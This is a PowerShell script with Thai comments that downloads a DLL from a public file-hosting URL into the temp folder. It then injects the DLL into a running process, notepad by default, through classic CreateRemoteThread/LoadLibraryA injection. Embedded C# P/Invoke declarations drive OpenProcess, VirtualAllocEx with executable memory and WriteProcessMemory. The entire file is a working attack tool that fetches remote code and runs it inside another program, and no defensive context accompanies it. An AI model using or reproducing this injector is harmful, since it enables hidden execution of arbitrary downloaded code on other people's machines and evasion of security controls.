
$dllUrl = "https://files.catbox.moe/ckvw0z.dll"  # เปลี่ยนเป็นลิงก์ DLL ของคุณ
$tempPath = "$env:TEMP\test.dll"          # ที่พักไฟล์ชั่วคราว

# 2. ดาวน์โหลดไฟล์ DLL มาที่เครื่อง
Write-Host "กำลังดาวน์โหลด DLL..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath

# 3. ระบุ Process เป้าหมาย (เช่น notepad)
$processName = "notepad"
$targetProcess = Get-Process $processName -ErrorAction SilentlyContinue

if (-not $targetProcess) {
    Write-Host "ไม่พบโปรแกรม $processName กรุณาเปิดโปรแกรมก่อน!" -ForegroundColor Red
    return
}

# 4. ใช้ C# Snippet เพื่อเรียกใช้ฟังก์ชัน LoadLibrary จาก Windows API
$Source = @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type -TypeDefinition $Source

# 5. เริ่มกระบวนการ Inject
$hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProcess.Id)
$dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempPath)
$allocMem = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllPathBytes.Length, 0x3000, 0x40)

# แก้ไขจุดนี้: ใช้ [ref] และตรวจสอบตัวแปร
$bytesWritten = [IntPtr]::Zero
$success = [Injector]::WriteProcessMemory($hProcess, $allocMem, $dllPathBytes, [uint32]$dllPathBytes.Length, [ref]$bytesWritten)

if ($success) {
    $loadLibraryAddr = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
    [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
    Write-Host "Inject สำเร็จแล้ว!" -ForegroundColor Green
} else {
    Write-Host "เขียน Memory ไม่สำเร็จ!" -ForegroundColor Red
}
